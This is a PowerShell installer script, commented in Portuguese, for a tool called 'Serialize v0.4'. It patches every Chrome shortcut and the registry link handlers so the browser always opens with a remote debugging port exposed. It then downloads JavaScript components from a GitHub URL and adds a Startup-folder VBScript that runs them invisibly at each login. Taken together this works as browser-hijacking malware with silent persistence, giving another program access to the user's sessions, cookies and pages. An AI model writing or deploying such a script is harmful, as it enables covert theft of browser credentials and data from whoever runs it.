# Serialize Installer - Version 0.4
$installPath = "$env:APPDATA\Serialize"
if (!(Test-Path $installPath)) { New-Item -Path $installPath -ItemType Directory }

Write-Host "--- Iniciando Instalação do Serialize v0.4 (Onipresente) ---" -ForegroundColor Cyan

# 1. Função para injetar flag em TODOS os atalhos possíveis (Desktop, Barra de Tarefas, Menu Iniciar)
function Patch-All-Shortcuts {
    $shell = New-Object -ComObject WScript.Shell
    $paths = @(
        [System.Environment]::GetFolderPath('Desktop'),
        "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar",
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            Get-ChildItem -Path $path -Filter "*Chrome*.lnk" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    $shortcut = $shell.CreateShortcut($_.FullName)
                    if ($shortcut.TargetPath -like "*chrome.exe*") {
                        $shortcut.Arguments = "--remote-debugging-port=9222"
                        $shortcut.Save()
                        Write-Host "Flag injetada em: $($_.Name)" -ForegroundColor Green
                    }
                } catch { }
            }
        }
    }
}

# 2. Patch de Registro: Força a flag mesmo abrindo por links externos
Write-Host "Aplicando patch no Registro do Windows..." -ForegroundColor Yellow
$chromeRegCommand = "`"C:\Program Files\Google\Chrome\Application\chrome.exe`" --remote-debugging-port=9222 -- `"%1`""
$regPaths = @(
    "HKCU:\Software\Classes\chromeHTML\shell\open\command",
    "HKCU:\Software\Classes\ChromeSSHTM\shell\open\command"
)

foreach ($reg in $regPaths) {
    if (!(Test-Path $reg)) { New-Item -Path $reg -Force | Out-Null }
    Set-ItemProperty -Path $reg -Name "(Default)" -Value $chromeRegCommand
}

# 3. Executa a varredura de atalhos
Patch-All-Shortcuts

# 4. Baixa os componentes do repositório
Write-Host "Baixando componentes do Serialize..." -ForegroundColor Yellow
$baseUrl = "https://raw.githubusercontent.com/denishark333/serialize1.0/main"
Invoke-WebRequest -Uri "$baseUrl/core.js" -OutFile "$installPath\core.js" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "$baseUrl/bridge.js" -OutFile "$installPath\bridge.js" -ErrorAction SilentlyContinue

# 5. Criar o VBScript para rodar o Bridge de forma invisível
$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SerializeBridge.vbs"
$vbsContent = @"
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run "node.exe $installPath\bridge.js", 0
Set WinScriptHost = Nothing
"@
$vbsContent | Out-File $vbsPath -Encoding ASCII

Write-Host "--- Serialize v0.4 instalado com sucesso! ---" -ForegroundColor Cyan
Write-Host "Agora o Bridge encontrará o Chrome por qualquer atalho."
